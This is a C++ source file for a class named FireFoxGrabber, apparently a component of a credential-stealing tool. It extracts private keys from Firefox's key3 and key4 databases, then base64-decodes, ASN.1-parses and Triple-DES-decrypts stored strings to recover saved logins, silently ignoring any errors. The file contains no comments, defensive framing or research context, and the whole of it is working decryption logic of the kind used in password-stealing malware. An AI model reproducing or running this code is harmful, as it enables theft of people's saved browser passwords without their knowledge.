#include "FireFoxGrabber.h"

void FireFoxGrabber::ProcessKey(const string & fileName, bool isKey3)
{
	try
	{
		vector<byte> temp;
		if (isKey3)
			temp = FireFoxBase::ExtractPrivateKey3(fileName);
		else
			temp = FireFoxBase::ExtractPrivateKey4(fileName);
		if (!temp.empty())
			key.push_back(temp);
	}
	catch (...) { return; }
}

string FireFoxGrabber::DecryptStr(const string & str)
{
	try
	{
		vector<byte> bStr;
		string s = base64_decode(str);
		for (size_t i = 0; i < s.size(); ++i)
			bStr.push_back(s[i]);
		Asn1DerObject obj = Asn1Der().Parse(bStr);
		
		string result = "";
		for (size_t i = 0; i < key.size(); ++i)
		{
			result = TripleDes::DecryptAsString(key[i], obj.objects[0].objects[1].objects[1].Data, obj.objects[0].objects[2].Data);
			if (!result.empty())
				return result;
		}

		return result;
	}
	catch (...) { return string(); }
}

bool FireFoxGrabber::IsSuccess()
{
	return !key.empty();
}